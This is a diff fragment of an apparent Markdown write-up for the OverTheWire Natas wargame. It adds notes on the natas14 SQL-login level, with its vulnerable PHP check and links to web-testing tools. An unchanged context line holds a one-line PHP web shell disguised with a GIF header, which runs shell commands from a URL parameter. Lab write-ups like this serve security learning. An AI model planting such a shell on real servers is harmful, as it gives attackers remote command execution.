@@ -318,3 +318,21 @@ if($key != "") {
 # webshell2.php
 GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
 ```
+
+## 14->15
+- http://natas14.natas.labs.overthewire.org/
+- `natas15:`
+- This challenge shows a query to a database to check user inputted Username and Password information. It only checks that the query returns more than one row, which gives a clue that we need to submit a query somehow to the server.
+- https://www.php.net/manual/en/function.mysqli-connect.php
+```php
+if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+```
+- Some useful tools
+  - https://learnhacking.io/basic-web-skills-dev-tools/
+  - https://learnhacking.io/basic-web-skills-setting-up-burp-suite/
+  - https://chromewebstore.google.com/detail/foxyproxy/gcknhkkoolaabfmlnjonogaaifnjlfnp?hl=en&pli=1
+  - https://primer.picoctf.org/#_introduction
